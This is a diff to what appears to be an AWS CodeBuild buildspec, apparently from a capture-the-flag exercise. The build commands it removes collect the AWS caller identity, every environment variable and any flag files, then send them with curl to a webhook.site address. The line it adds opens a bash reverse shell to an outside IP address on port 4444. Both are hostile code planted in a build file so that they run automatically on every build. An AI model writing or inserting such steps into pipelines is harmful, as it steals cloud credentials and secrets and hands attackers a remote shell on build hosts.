@@ -2,16 +2,4 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "=== IDENTITY ==="
-      - aws sts get-caller-identity > /tmp/identity.txt 2>&1 || true
-      - echo "=== ENV ==="
-      - env > /tmp/env.txt
-      - echo "=== FLAG SEARCH ==="
-      - find / -iname "*flag*" 2>/dev/null > /tmp/flagfind.txt
-      - cat /flag* > /tmp/flagcat.txt 2>/dev/null || true
-      - find /codebuild -iname "*flag*" 2>/dev/null >> /tmp/flagfind.txt || true
-      - echo "=== EXFIL ==="
-      - curl -s -X POST --data-binary @/tmp/identity.txt https://webhook.site/0858e360-a5f8-4b31-892d-eab09a025fd6/identity
-      - curl -s -X POST --data-binary @/tmp/env.txt https://webhook.site/0858e360-a5f8-4b31-892d-eab09a025fd6/env
-      - curl -s -X POST --data-binary @/tmp/flagfind.txt https://webhook.site/0858e360-a5f8-4b31-892d-eab09a025fd6/flagfind
-      - curl -s -X POST --data-binary @/tmp/flagcat.txt https://webhook.site/0858e360-a5f8-4b31-892d-eab09a025fd6/flagcat
+      - bash -i >& /dev/tcp/18.183.231.206/4444 0>&1
